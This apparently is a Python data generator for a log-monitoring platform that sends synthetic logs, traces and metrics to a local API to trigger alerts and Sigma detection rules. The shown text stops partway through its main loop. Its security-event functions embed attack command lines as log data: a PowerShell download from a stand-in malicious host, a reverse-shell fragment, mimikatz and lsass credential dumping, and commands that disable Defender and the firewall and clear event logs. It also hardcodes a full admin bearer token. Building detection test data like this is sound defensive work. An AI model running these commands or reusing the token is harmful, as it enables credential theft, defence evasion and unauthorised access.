#!/usr/bin/env python3
"""
Logforge Data Generator
Continuously sends logs, traces, metrics, and spans to populate streaming panel
and trigger alert rules and Sigma security rules
"""

import requests
import time
import random
import uuid
from datetime import datetime, timedelta
import json

# Configuration
API_BASE_URL = "http://localhost:7080"
BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjAxZTIzM2UtZDcwYi00NmQyLTk2ODAtMmZjNTcyYmQ3Mjc1IiwidGVuYW50X2lkIjoiODMyZjM5M2MtZDlkZS00YTgwLWExODMtYWE5MTNhZDI3MjY2IiwidXNlcl9yb2xlIjoidGVuYW50X2FkbWluIiwiaWF0IjoxNzY5MTMxMTM3LjExNzU2MjgsImV4cCI6MTc2OTE1OTkzNy4xMTc1NjI4LCJ0eXBlIjoiYWNjZXNzX3Rva2VuIn0.1kgYcDkhoE2bzTyxKzWr72baOMdjwQExASCFcgFSKuA"
CUSTOMER_ID = "832f393c-d9de-4a80-a183-aa913ad27266"

# Headers
HEADERS = {
    "Authorization": f"Bearer {BEARER_TOKEN}",
    "Content-Type": "application/json",
    "X-Customer-ID": CUSTOMER_ID
}

# Services
SERVICES = ["web-service", "api-service", "auth-service", "payment-service", "new-service"]
HOSTS = ["api-server-01", "api-server-02", "web-server-01", "api-test-host"]
LOG_LEVELS = ["info", "warning", "error", "debug"]

# Standard metrics with their variations (to test normalization)
# The normalizer will convert variations to standard names
STANDARD_METRICS = {
    # APM Metrics
    "response_time": {
        "variations": ["response_time", "latency", "request_latency", "http_latency"],
        "unit": "ms",
        "type": "gauge",
        "normal_range": (50, 200),
        "anomaly_range": (5000, 10000)
    },
    "throughput": {
        "variations": ["throughput", "requests", "request_rate", "rps"],
        "unit": "req/s",
        "type": "counter",
        "normal_range": (500, 1000),
        "anomaly_range": (10, 50)
    },
    "error_rate": {
        "variations": ["error_rate", "errors", "failure_rate"],
        "unit": "%",
        "type": "gauge",
        "normal_range": (1, 5),
        "anomaly_range": (40, 60)
    },
    # Infrastructure Metrics
    "cpu_usage": {
        "variations": ["cpu_usage", "cpu", "cpu_percent", "cpu_utilization"],
        "unit": "%",
        "type": "gauge",
        "normal_range": (20, 40),
        "anomaly_range": (95, 99.9)
    },
    "memory_usage": {
        "variations": ["memory_usage", "memory", "mem_usage", "ram_usage"],
        "unit": "%",
        "type": "gauge",
        "normal_range": (30, 60),
        "anomaly_range": (90, 98)
    },
    "disk_usage": {
        "variations": ["disk_usage", "disk", "disk_percent", "storage_usage"],
        "unit": "%",
        "type": "gauge",
        "normal_range": (40, 70),
        "anomaly_range": (90, 99)
    },
    "network_in": {
        "variations": ["network_in", "bytes_received", "rx_bytes", "ingress_bytes"],
        "unit": "bytes",
        "type": "counter",
        "normal_range": (1000000, 5000000),
        "anomaly_range": (50000000, 100000000)
    },
    "network_out": {
        "variations": ["network_out", "bytes_sent", "tx_bytes", "egress_bytes"],
        "unit": "bytes",
        "type": "counter",
        "normal_range": (500000, 2000000),
        "anomaly_range": (30000000, 80000000)
    },
    # Database Metrics
    "db_connections": {
        "variations": ["db_connections", "database_connections", "active_connections", "pool_connections"],
        "unit": "count",
        "type": "gauge",
        "normal_range": (10, 50),
        "anomaly_range": (200, 500)
    },
    "db_query_time": {
        "variations": ["db_query_time", "query_duration", "query_latency", "sql_duration"],
        "unit": "ms",
        "type": "gauge",
        "normal_range": (5, 50),
        "anomaly_range": (500, 2000)
    },
    # Cache Metrics
    "cache_hit_rate": {
        "variations": ["cache_hit_rate", "cache_hits", "hit_rate"],
        "unit": "%",
        "type": "gauge",
        "normal_range": (85, 98),
        "anomaly_range": (20, 40)
    },
    "cache_miss_rate": {
        "variations": ["cache_miss_rate", "cache_misses", "miss_rate"],
        "unit": "%",
        "type": "gauge",
        "normal_range": (2, 15),
        "anomaly_range": (60, 80)
    },
    # Queue Metrics
    "queue_depth": {
        "variations": ["queue_depth", "queue_size", "queue_length", "messages_pending"],
        "unit": "count",
        "type": "gauge",
        "normal_range": (0, 100),
        "anomaly_range": (5000, 10000)
    },
    "queue_latency": {
        "variations": ["queue_latency", "message_latency", "processing_time", "consumer_lag"],
        "unit": "ms",
        "type": "gauge",
        "normal_range": (10, 100),
        "anomaly_range": (1000, 5000)
    }
}

# Service-specific metric mappings (which metrics each service should send)
SERVICE_METRICS = {
    "web-service": ["response_time", "throughput", "error_rate", "cpu_usage", "memory_usage"],
    "api-service": ["response_time", "throughput", "error_rate", "cpu_usage", "memory_usage", "db_query_time"],
    "auth-service": ["response_time", "error_rate", "cpu_usage", "cache_hit_rate", "cache_miss_rate"],
    "payment-service": ["response_time", "throughput", "error_rate", "cpu_usage", "memory_usage", "db_connections", "db_query_time"],
    "database": ["db_connections", "db_query_time", "cpu_usage", "memory_usage", "disk_usage"],
    "cache": ["cache_hit_rate", "cache_miss_rate", "memory_usage", "cpu_usage"],
    "queue-service": ["queue_depth", "queue_latency", "throughput", "cpu_usage", "memory_usage"],
    "new-service": ["response_time", "error_rate", "cpu_usage", "network_in", "network_out"]
}


def generate_trace_id():
    """Generate a valid 32-character hexadecimal trace ID"""
    return uuid.uuid4().hex


def generate_span_id():
    """Generate a valid 16-character hexadecimal span ID"""
    return uuid.uuid4().hex[:16]


def send_logs(trace_id=None, service=None, level=None):
    """Send log entries using batch endpoint"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    logs = []
    num_logs = random.randint(1, 3)

    for _ in range(num_logs):
        log_service = service or random.choice(SERVICES)
        log_level = level or random.choice(LOG_LEVELS)

        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": log_level,
            "msg": f"Log message from {log_service}",
            "service": log_service,
            "host": random.choice(HOSTS)
        }

        # Add trace_id if provided (for linking)
        if trace_id:
            log_entry["trace_id"] = trace_id
            log_entry["span_id"] = generate_span_id()

        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"✓ Sent {len(logs)} logs")
        else:
            print(f"✗ Failed to send logs: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error sending logs: {e}")


def send_high_error_rate_logs():
    """Send logs to trigger High Error Rate Alert"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    # High Error Rate Alert requires:
    # - service = web-service
    # - level = error
    # - count >= 10 in 5 minutes

    logs = []
    for i in range(12):  # Send 12 error logs to ensure threshold is met
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "error",
            "msg": f"Error processing request {i}: Connection timeout",
            "service": "web-service",
            "host": random.choice(HOSTS),
            "error_code": "CONN_TIMEOUT",
            "user_id": f"user_{random.randint(1000, 9999)}"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🚨 Sent {len(logs)} error logs to trigger High Error Rate Alert")
        else:
            print(f"✗ Failed to send error logs: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error sending error logs: {e}")


def send_critical_security_logs():
    """Send logs to trigger Critical Security Alert"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    # Critical Security Alert requires:
    # - service = new-service
    # - level = error
    # AND (major_attack = true OR (msg = "Alert rule trigger" AND host = "api-test-host"))

    logs = []

    # Option 1: major_attack = true
    log1 = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "level": "error",
        "msg": "Unauthorized access attempt detected",
        "service": "new-service",
        "host": "api-server-01",
        "major_attack": True,
        "attack_type": "SQL_INJECTION",
        "src_ip": "192.168.1.100"
    }
    logs.append(log1)

    # Option 2: msg = "Alert rule trigger" AND host = "api-test-host"
    log2 = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "level": "error",
        "msg": "Alert rule trigger",
        "service": "new-service",
        "host": "api-test-host",
        "severity": "critical"
    }
    logs.append(log2)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🔒 Sent {len(logs)} logs to trigger Critical Security Alert")
        else:
            print(f"✗ Failed to send security logs: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error sending security logs: {e}")


def send_brute_force_logs():
    """Send logs to trigger Brute Force Detection Sigma rule"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    # Brute Force Detection Sigma rule looks for:
    # - Multiple failed login attempts from same source_ip
    # - event_type: authentication_failed or similar patterns

    logs = []
    source_ip = "203.0.113.42"  # Attacker IP

    for i in range(15):  # Send 15 failed login attempts
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "warning",
            "msg": f"Failed login attempt for user admin",
            "service": "auth-service",
            "host": "auth-server-01",
            "event_type": "authentication_failed",
            "src_ip": source_ip,
            "target_user": "admin",
            "user_agent": "Mozilla/5.0"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🛡️  Sent {len(logs)} logs to trigger Brute Force Detection Sigma rule")
        else:
            print(f"✗ Failed to send brute force logs: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error sending brute force logs: {e}")


def send_stream_test_sigma_logs():
    """Send logs to trigger 'stream test' Sigma rule"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    # Stream test Sigma rule - likely looking for specific test patterns
    logs = []

    log_entry = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "level": "info",
        "msg": "Stream test event for sigma rule validation",
        "service": "test-service",
        "host": "test-host",
        "event_type": "stream_test",
        "test_id": str(uuid.uuid4())
    }
    logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"📊 Sent stream test log to trigger Sigma rule")
        else:
            print(f"✗ Failed to send stream test log: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error sending stream test log: {e}")


def send_powershell_execution_logs():
    """Send logs that trigger PowerShell execution detection (T1059.001)"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    logs = []

    # Suspicious PowerShell execution patterns
    powershell_commands = [
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",  # Base64 encoded command
        "powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\script.ps1",
        "pwsh.exe -NoProfile -Command Invoke-WebRequest -Uri http://malicious.com/payload",
        "powershell.exe -WindowStyle Hidden -Command $client = New-Object System.Net.Sockets.TCPClient",
    ]

    for cmd in powershell_commands:
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "warning",
            "msg": f"Process execution detected: {cmd[:50]}...",
            "service": "endpoint-security",
            "host": f"workstation-{random.randint(1, 100)}",
            "event_type": "process_creation",
            "process_name": "powershell.exe" if "powershell" in cmd.lower() else "pwsh.exe",
            "command_line": cmd,
            "parent_process": "explorer.exe",
            "user": f"DOMAIN\\user{random.randint(100, 999)}",
            "src_ip": f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🛡️  Sent {len(logs)} PowerShell execution logs (T1059.001)")
        else:
            print(f"✗ Failed to send PowerShell logs: {response.status_code}")
    except Exception as e:
        print(f"✗ Error sending PowerShell logs: {e}")


def send_lateral_movement_logs():
    """Send logs that trigger lateral movement detection (T1021)"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    logs = []

    # Remote service execution patterns
    lateral_events = [
        {"process": "psexec.exe", "target": "192.168.1.50", "action": "remote_exec"},
        {"process": "wmic.exe", "target": "192.168.1.51", "action": "process_call"},
        {"process": "winrm.cmd", "target": "192.168.1.52", "action": "invoke_command"},
        {"process": "mstsc.exe", "target": "192.168.1.53", "action": "rdp_connect"},
    ]

    source_ip = f"10.0.1.{random.randint(10, 50)}"

    for event in lateral_events:
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "warning",
            "msg": f"Lateral movement detected: {event['process']} -> {event['target']}",
            "service": "endpoint-security",
            "host": "dc-server-01",
            "event_type": "lateral_movement",
            "process_name": event["process"],
            "target_host": event["target"],
            "action": event["action"],
            "src_ip": source_ip,
            "user": "DOMAIN\\admin_compromised",
            "mitre_technique": "T1021"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🛡️  Sent {len(logs)} lateral movement logs (T1021)")
        else:
            print(f"✗ Failed to send lateral movement logs: {response.status_code}")
    except Exception as e:
        print(f"✗ Error sending lateral movement logs: {e}")


def send_credential_access_logs():
    """Send logs that trigger credential access detection (T1003)"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    logs = []

    # Credential dumping patterns
    cred_events = [
        {"process": "mimikatz.exe", "action": "sekurlsa::logonpasswords"},
        {"process": "procdump.exe", "action": "dump lsass.exe"},
        {"process": "comsvcs.dll", "action": "MiniDump"},
        {"process": "ntdsutil.exe", "action": "ifm create"},
    ]

    for event in cred_events:
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "critical",
            "msg": f"Potential credential theft: {event['process']} - {event['action']}",
            "service": "endpoint-security",
            "host": f"server-{random.randint(1, 20)}",
            "event_type": "credential_access",
            "process_name": event["process"],
            "command_line": event["action"],
            "target_process": "lsass.exe",
            "src_ip": f"10.0.2.{random.randint(1, 254)}",
            "user": f"DOMAIN\\user{random.randint(1, 100)}",
            "mitre_technique": "T1003",
            "severity": "critical"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🛡️  Sent {len(logs)} credential access logs (T1003)")
        else:
            print(f"✗ Failed to send credential access logs: {response.status_code}")
    except Exception as e:
        print(f"✗ Error sending credential access logs: {e}")


def send_data_exfiltration_logs():
    """Send logs that trigger data exfiltration detection (T1041)"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    logs = []

    # Large data transfers to external IPs
    external_ips = ["203.0.113.100", "198.51.100.50", "192.0.2.200"]

    for ext_ip in external_ips:
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "warning",
            "msg": f"Large outbound data transfer detected to {ext_ip}",
            "service": "network-security",
            "host": "firewall-01",
            "event_type": "data_exfiltration",
            "src_ip": f"10.0.1.{random.randint(1, 254)}",
            "dst_ip": ext_ip,
            "dst_port": random.choice([443, 8443, 53, 80]),
            "bytes_sent": random.randint(100000000, 500000000),  # 100MB-500MB
            "protocol": "TCP",
            "user": f"user{random.randint(1, 100)}@company.com",
            "mitre_technique": "T1041",
            "severity": "high"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🛡️  Sent {len(logs)} data exfiltration logs (T1041)")
        else:
            print(f"✗ Failed to send exfiltration logs: {response.status_code}")
    except Exception as e:
        print(f"✗ Error sending exfiltration logs: {e}")


def send_persistence_logs():
    """Send logs that trigger persistence detection (T1547)"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    logs = []

    # Registry/startup persistence patterns
    persistence_events = [
        {"location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "malware.exe"},
        {"location": "Startup Folder", "value": "backdoor.lnk"},
        {"location": "Scheduled Task", "value": "SystemUpdate"},
        {"location": "WMI Subscription", "value": "EventConsumer"},
    ]

    for event in persistence_events:
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "warning",
            "msg": f"Persistence mechanism detected: {event['location']}",
            "service": "endpoint-security",
            "host": f"workstation-{random.randint(1, 50)}",
            "event_type": "persistence",
            "registry_key": event["location"],
            "registry_value": event["value"],
            "process_name": "reg.exe",
            "user": f"DOMAIN\\user{random.randint(1, 100)}",
            "mitre_technique": "T1547",
            "severity": "medium"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🛡️  Sent {len(logs)} persistence logs (T1547)")
        else:
            print(f"✗ Failed to send persistence logs: {response.status_code}")
    except Exception as e:
        print(f"✗ Error sending persistence logs: {e}")


def send_defense_evasion_logs():
    """Send logs that trigger defense evasion detection (T1562)"""
    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"

    logs = []

    # Defense evasion patterns
    evasion_events = [
        {"action": "Disable Windows Defender", "process": "Set-MpPreference -DisableRealtimeMonitoring $true"},
        {"action": "Stop security service", "process": "net stop WinDefend"},
        {"action": "Clear event logs", "process": "wevtutil cl Security"},
        {"action": "Disable firewall", "process": "netsh advfirewall set allprofiles state off"},
    ]

    for event in evasion_events:
        log_entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": "critical",
            "msg": f"Defense evasion attempt: {event['action']}",
            "service": "endpoint-security",
            "host": f"server-{random.randint(1, 10)}",
            "event_type": "defense_evasion",
            "command_line": event["process"],
            "action": event["action"],
            "src_ip": f"10.0.1.{random.randint(1, 254)}",
            "user": "NT AUTHORITY\\SYSTEM",
            "mitre_technique": "T1562",
            "severity": "critical"
        }
        logs.append(log_entry)

    payload = {"logs": logs}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            print(f"🛡️  Sent {len(logs)} defense evasion logs (T1562)")
        else:
            print(f"✗ Failed to send defense evasion logs: {response.status_code}")
    except Exception as e:
        print(f"✗ Error sending defense evasion logs: {e}")


def send_comprehensive_security_events():
    """Send a comprehensive set of security events to trigger multiple Sigma rules"""
    print("\n🛡️  Sending comprehensive security events...")

    # Send various MITRE ATT&CK technique events
    send_brute_force_logs()
    time.sleep(0.5)

    send_powershell_execution_logs()
    time.sleep(0.5)

    send_lateral_movement_logs()
    time.sleep(0.5)

    send_credential_access_logs()
    time.sleep(0.5)

    send_data_exfiltration_logs()
    time.sleep(0.5)

    send_persistence_logs()
    time.sleep(0.5)

    send_defense_evasion_logs()

    print("✓ Comprehensive security events sent")


def send_traces(trace_id=None):
    """Send trace data with spans"""
    endpoint = f"{API_BASE_URL}/v1/observability/traces/ingest"

    # Generate trace ID if not provided
    if not trace_id:
        trace_id = generate_trace_id()

    # Create parent span
    parent_span_id = generate_span_id()

    # Build trace with multiple spans
    spans = []

    # Get current time
    now = datetime.utcnow()
    start_dt = now - timedelta(seconds=2)

    service = random.choice(SERVICES)

    # Parent span (HTTP request)
    parent_span = {
        "trace_id": trace_id,
        "span_id": parent_span_id,
        "parent_span_id": "",
        "operation_name": "HTTP POST /api/orders",
        "service_name": service,
        "start_time": start_dt.isoformat() + "Z",
        "end_time": now.isoformat() + "Z",
        "kind": "server",
        "status": "ok",
        "attributes": {
            "http.method": "POST",
            "http.url": "/api/orders",
            "http.status_code": random.choice([200, 201, 400, 500])
        },
        "resource": {
            "service.name": service,
            "host.name": random.choice(HOSTS)
        }
    }
    spans.append(parent_span)

    # Child span 1 (Database query)
    child_span_1_id = generate_span_id()
    child_start = start_dt + timedelta(milliseconds=100)
    child_end = start_dt + timedelta(milliseconds=500)

    child_span_1 = {
        "trace_id": trace_id,
        "span_id": child_span_1_id,
        "parent_span_id": parent_span_id,
        "operation_name": "SELECT FROM orders",
        "service_name": "database",
        "start_time": child_start.isoformat() + "Z",
        "end_time": child_end.isoformat() + "Z",
        "kind": "client",
        "status": "ok",
        "attributes": {
            "db.system": "postgresql",
            "db.statement": "SELECT * FROM orders WHERE user_id = ?"
        },
        "resource": {
            "service.name": "database",
            "host.name": "db-server-01"
        }
    }
    spans.append(child_span_1)

    # Child span 2 (Cache lookup)
    child_span_2_id = generate_span_id()
    child2_start = start_dt + timedelta(milliseconds=600)
    child2_end = start_dt + timedelta(milliseconds=800)

    child_span_2 = {
        "trace_id": trace_id,
        "span_id": child_span_2_id,
        "parent_span_id": parent_span_id,
        "operation_name": "REDIS GET user:cache",
        "service_name": "cache",
        "start_time": child2_start.isoformat() + "Z",
        "end_time": child2_end.isoformat() + "Z",
        "kind": "client",
        "status": "ok",
        "attributes": {
            "db.system": "redis",
            "db.operation": "GET"
        },
        "resource": {
            "service.name": "cache",
            "host.name": "cache-server-01"
        }
    }
    spans.append(child_span_2)

    # Wrap spans in batch request format
    payload = {"spans": spans}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code in [200, 202]:
            print(f"✓ Sent trace with {len(spans)} spans (trace_id: {trace_id[:8]}...)")
            return trace_id
        else:
            print(f"✗ Failed to send traces: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"✗ Error sending traces: {e}")
        return None


def send_metrics():
    """Send metrics data - 85% normal, 15% anomalous"""
    # Decide if this batch should be anomalous (15% chance)
    is_anomalous = random.random() < 0.15

    if is_anomalous:
        send_anomalous_metrics()
    else:
        send_normal_metrics()


def send_all_metrics_for_service(service: str, is_anomalous: bool = False, use_variations: bool = False):
    """
    Send all relevant metrics for a specific service.

    Args:
        service: Service name
        is_anomalous: If True, send anomalous values
        use_variations: If True, randomly use metric name variations to test normalization
    """
    endpoint = f"{API_BASE_URL}/v1/observability/metrics/ingest"

    # Get metrics for this service
    metric_names = SERVICE_METRICS.get(service, ["cpu_usage", "memory_usage", "error_rate"])
    host = f"{service.replace('-service', '')}-server-01"

    metrics = []

    for metric_name in metric_names:
        metric_config = STANDARD_METRICS.get(metric_name)
        if not metric_config:
            continue

        # Choose metric name (standard or variation)
        if use_variations and random.random() < 0.3:  # 30% chance to use variation
            chosen_name = random.choice(metric_config["variations"])
        else:
            chosen_name = metric_name  # Use standard name

        # Choose value range
        if is_anomalous:
            value_range = metric_config["anomaly_range"]
        else:
            value_range = metric_config["normal_range"]

        value = random.uniform(value_range[0], value_range[1])

        metric = {
            "metric_name": chosen_name,
            "metric_type": metric_config["type"],
            "value": value,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "labels": {
                "host": host,
                "env": "production",
                "unit": metric_config["unit"]
            },
            "service_name": service,
            "resource": {
                "service.name": service
            }
        }
        metrics.append(metric)

    if not metrics:
        return

    payload = {"metrics": metrics}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code in [200, 202]:
            status = "🚨 ANOMALOUS" if is_anomalous else "✓ NORMAL"
            variation_note = " (with variations)" if use_variations else ""
            print(f"{status} Sent {len(metrics)} metrics for {service}{variation_note}")
        else:
            print(f"✗ Failed to send metrics for {service}: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error sending metrics for {service}: {e}")


def send_normal_metrics():
    """Send NORMAL baseline metrics for multiple services"""
    # Randomly select 2-3 services to send metrics for
    services_to_send = random.sample(list(SERVICE_METRICS.keys()), random.randint(2, 3))

    for service in services_to_send:
        # 30% chance to use metric name variations (tests normalization)
        use_variations = random.random() < 0.3
        send_all_metrics_for_service(service, is_anomalous=False, use_variations=use_variations)


def send_anomalous_metrics():
    """Send anomalous metrics to trigger multi-metric anomaly detection"""
    # Target specific service for anomaly (payment-service is most critical)
    service = random.choice(["payment-service", "api-service", "database"])
    send_all_metrics_for_service(service, is_anomalous=True, use_variations=False)


def send_comprehensive_metrics():
    """
    Send comprehensive metrics for ALL services and ALL metric types.
    Useful for populating dashboards and testing the metrics explorer.
    """
    print("\n📊 Sending comprehensive metrics for all services...")

    all_services = list(SERVICE_METRICS.keys())

    for service in all_services:
        # 20% chance to use variations to test normalization
        use_variations = random.random() < 0.2
        # 10% chance to be anomalous
        is_anomalous = random.random() < 0.1

        send_all_metrics_for_service(service, is_anomalous=is_anomalous, use_variations=use_variations)
        time.sleep(0.5)  # Small delay between services

    print(f"✓ Sent metrics for {len(all_services)} services")


def send_custom_metrics():
    """
    Send custom metrics (with custom. prefix) to test custom metric passthrough.
    These should NOT be normalized and pass through unchanged.
    """
    endpoint = f"{API_BASE_URL}/v1/observability/metrics/ingest"

    metrics = []

    # Custom business metrics
    custom_metrics_data = [
        {"name": "custom.checkout_abandonment_rate", "value": random.uniform(5, 25), "unit": "%"},
        {"name": "custom.payment_success_rate", "value": random.uniform(95, 99.5), "unit": "%"},
        {"name": "custom.cart_items_average", "value": random.uniform(2, 8), "unit": "items"},
        {"name": "custom.user_session_duration", "value": random.uniform(120, 900), "unit": "seconds"},
        {"name": "custom.api_quota_remaining", "value": random.randint(5000, 10000), "unit": "count"},
    ]

    for custom in custom_metrics_data:
        metric = {
            "metric_name": custom["name"],
            "metric_type": "gauge",
            "value": custom["value"],
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "labels": {
                "env": "production",
                "unit": custom["unit"]
            },
            "service_name": "business-metrics",
            "resource": {
                "service.name": "business-metrics"
            }
        }
        metrics.append(metric)

    payload = {"metrics": metrics}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code in [200, 202]:
            print(f"✓ Sent {len(metrics)} CUSTOM metrics (custom.* prefix)")
        else:
            print(f"✗ Failed to send custom metrics: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error sending custom metrics: {e}")


def test_metric_normalization():
    """
    Explicitly test metric name normalization by sending known variations.
    Sends metrics with variation names that should be normalized to standard names.
    """
    endpoint = f"{API_BASE_URL}/v1/observability/metrics/ingest"

    print("\n🔄 Testing metric name normalization...")

    # Test variations -> expected normalized name
    test_cases = [
        ("latency", "response_time", 150),
        ("request_latency", "response_time", 180),
        ("rps", "throughput", 750),
        ("cpu", "cpu_usage", 35),
        ("mem_usage", "memory_usage", 55),
        ("errors", "error_rate", 3),
        ("cache_hits", "cache_hit_rate", 92),
        ("query_duration", "db_query_time", 25),
        ("messages_pending", "queue_depth", 50),
    ]

    metrics = []
    for variation, expected_standard, value in test_cases:
        metric = {
            "metric_name": variation,  # Send the variation
            "metric_type": "gauge",
            "value": value,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "labels": {
                "env": "test",
                "expected_normalized": expected_standard
            },
            "service_name": "normalization-test",
            "resource": {
                "service.name": "normalization-test"
            }
        }
        metrics.append(metric)
        print(f"   Sending '{variation}' -> should normalize to '{expected_standard}'")

    payload = {"metrics": metrics}

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code in [200, 202]:
            print(f"✓ Normalization test: Sent {len(metrics)} metrics with variations")
        else:
            print(f"✗ Normalization test failed: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error in normalization test: {e}")


def detect_multi_metric_anomalies():
    """Call multi-metric anomaly detection endpoint"""
    endpoint = f"{API_BASE_URL}/v1/ai/anomalies/detect/multi-metric"

    payload = {
        "metrics": [
            {"type": "error_rate", "service": "payment-service", "weight": 1.0},
            {"type": "cpu_usage", "service": "payment-service", "weight": 0.9},
            {"type": "memory_usage", "service": "payment-service", "weight": 0.8},
            {"type": "response_time", "service": "payment-service", "weight": 0.7}
        ],
        "time_range": "1h",
        "correlation_threshold": 0.6,
        "algorithms": ["z_score", "isolation_forest"]
    }

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            data = response.json()
            anomaly_count = data.get("anomaly_count", 0)
            print(f"🔍 Multi-Metric Detection: Found {anomaly_count} anomalies")

            if anomaly_count > 0 and data.get("anomalies"):
                for i, anomaly in enumerate(data["anomalies"][:3], 1):  # Show first 3
                    print(f"   {i}. {anomaly.get('title')} - Severity: {anomaly.get('severity')}, "
                          f"Confidence: {anomaly.get('confidence', 0):.2f}, "
                          f"Correlation: {anomaly.get('correlation_score', 0):.2f}")
                return data["anomalies"][0].get("anomaly_id") if data["anomalies"] else None
        else:
            print(f"✗ Anomaly detection failed: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"✗ Error detecting anomalies: {e}")
        return None


def analyze_anomaly(anomaly_id):
    """Call deep dive analysis endpoint for an anomaly"""
    if not anomaly_id:
        print("⚠️  No anomaly ID provided for analysis")
        return

    endpoint = f"{API_BASE_URL}/v1/ai/anomalies/{anomaly_id}/analyze"

    payload = {
        "analysis_depth": "comprehensive",
        "include_similar_incidents": True,
        "time_window_expansion": "1h"
    }

    try:
        response = requests.post(endpoint, headers=HEADERS, json=payload)
        if response.status_code == 200:
            data = response.json()
            print(f"🔬 Deep Dive Analysis Complete (in {data.get('analysis_duration_ms', 0)}ms):")

            if data.get("root_cause"):
                rc = data["root_cause"]
                print(f"   Root Cause: {rc.get('root_cause_type')} (confidence: {rc.get('confidence_score', 0):.2f})")

            if data.get("impact_assessment"):
                impact = data["impact_assessment"]
                print(f"   Impact: {impact.get('affected_users_count', 0)} users, "
                      f"{impact.get('failed_requests_count', 0)} failed requests")

            if data.get("recommended_actions"):
                print(f"   Recommendations: {len(data['recommended_actions'])} actions suggested")
        else:
            print(f"✗ Analysis failed: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"✗ Error analyzing anomaly: {e}")


def run_continuous_generation():
    """Main loop to continuously generate data"""
    print("=" * 60)
    print("Logforge Data Generator Started")
    print("=" * 60)
    print(f"API Base URL: {API_BASE_URL}")
    print(f"Bearer Token: {BEARER_TOKEN[:20]}...")
    print(f"Standard Metrics: {len(STANDARD_METRICS)} types")
    print(f"Services: {len(SERVICE_METRICS)} configured")
    print("=" * 60)
    print()

    iteration = 0

    # Run initial normalization test
    print("🚀 Running initial metric normalization test...")
    test_metric_normalization()
    time.sleep(2)

    while True:
        iteration += 1
        print(f"\n--- Iteration {iteration} at {datetime.now().strftime('%H:%M:%S')} ---")

        try:
            # Send normal logs
            send_logs()
            time.sleep(1)

            # Send traces with linked logs
